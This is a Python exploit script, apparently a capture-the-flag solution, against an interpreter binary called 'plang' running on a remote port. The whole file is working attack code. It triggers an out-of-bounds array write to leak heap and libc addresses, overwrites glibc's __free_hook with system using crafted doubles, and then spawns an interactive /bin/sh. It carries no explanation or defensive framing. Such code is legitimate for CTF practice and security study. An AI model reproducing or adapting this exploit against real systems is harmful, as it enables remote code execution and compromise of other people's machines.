#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './plang'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    exploit_js = \
    ''' var s = "hoge"
        var a = [1,2,3]
        a[-0xc2] = 1

        System.print("heap:")
        System.print(s.byteAt_(0x40) + (s.byteAt_(0x41)<<8) + (s.byteAt_(0x42)<<16) + (s.byteAt_(0x43)<<24))
        System.print(s.byteAt_(0x44) + (s.byteAt_(0x45)<<8))

        System.print("libc:")
        System.print(s.byteAt_(0xf8) + (s.byteAt_(0xf9)<<8) + (s.byteAt_(0xfa)<<16) + (s.byteAt_(0xfb)<<24))
        System.print(s.byteAt_(0xfc) + (s.byteAt_(0xfd)<<8))
    '''

    conn.recvuntil('> ')
    conn.send(exploit_js)

    conn.recvuntil('heap:\n> ')
    addr_heap_base  = int(conn.recvuntil('\n> ', drop=True))
    addr_heap_base += int(conn.recvuntil('\n> ', drop=True))<<32
    addr_heap_base -= 0xd730
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    conn.recvuntil('libc:\n> ')
    addr_libc_mainarena  = int(conn.recvuntil('\n> ', drop=True))
    addr_libc_mainarena += int(conn.recvuntil('\n', drop=True))<<32
    addr_libc_mainarena -= 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    put_double(conn, 'a', -2, addr_libc_free_hook - 8)
    put_double(conn, 'a', 0, addr_libc_system)

    conn.sendlineafter('> ', 'b = "/bin/sh"')

def put_double(conn, var, idx, value):
    conn.sendlineafter('> ', '%s[%d] = %.330f' % (var, idx, struct.unpack("d",p64(value))[0]))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
